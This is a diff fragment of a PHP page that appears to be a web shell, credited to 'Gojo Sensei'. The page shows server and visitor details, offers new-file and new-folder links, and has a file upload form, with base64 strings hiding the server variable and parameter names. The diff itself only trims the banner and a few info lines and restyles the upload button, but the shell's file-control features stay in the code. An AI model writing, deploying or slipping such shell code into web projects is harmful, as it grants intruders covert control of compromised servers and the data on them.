@@ -406,20 +406,15 @@ button, input:hover {
 </head>
 <body>
 <div class="table-responsive text-light" style="text-align: left;padding: 4px;border: 2px solid #4200ac;border-radius:5px;">
-    <div style="text-align: center;display: flex;align-items: center;justify-content: center;align-content: center;">
-        <a href="?" style="font-size: 2rem;font-family: Merienda;padding-left: 0.3rem;padding-right: 0.3rem;"><span class="kedip">👑SATORU GOJO 👑</span></a>
-    </div>
         <li>Your IP : <span style="color: red;"><?php echo $_SERVER[base64_decode('UkVNT1RFX0FERFI=')]; ?></span></li>
         <li>Server IP : <span style="color: red;"><?php echo $_SERVER[base64_decode('U0VSVkVSX05BTUU=')]; ?></span></li>
         <li>Server : <span style="color: red;"><?php echo php_uname(); ?></span></li>
-        <li>Server Software : <span style="color: red;"><?php echo $_SERVER[base64_decode('U0VSVkVSX1NPRlRXQVJF')]; ?></span></li>
-        <li>PHP Version : <span style="color: red;"><?php echo phpversion(); ?></span></li>
         <li>Made By : <span class="kedip">Gojo Sensei</span></li>
         <li><a href="?p=<?= ss($Jd) . base64_decode('JmE9') . Ss(base64_decode('bmV3RmlsZQ==')) ?>" class="ohct kedip-border">+ File</a> | <a href="?p=<?= Ss($Jd) . base64_decode('JmE9') . sS(base64_decode('bmV3RGly')) ?>" class="ohct kedip-border">+ Folder</a></li>
         <li>
             <form method="post" enctype="multipart/form-data" style="padding: 0.10rem;display: inline-block;">
     <input type="file" name="files[]">
-    <input type="submit" value="Upload" name="submit" class="button ohct">
+    <input type="submit" value="Upload" name="submit" class="button ohct kedip-border">
 </form>
 
 <?php if (!isset($_FILES[base64_decode('ZmlsZXM=')])) {
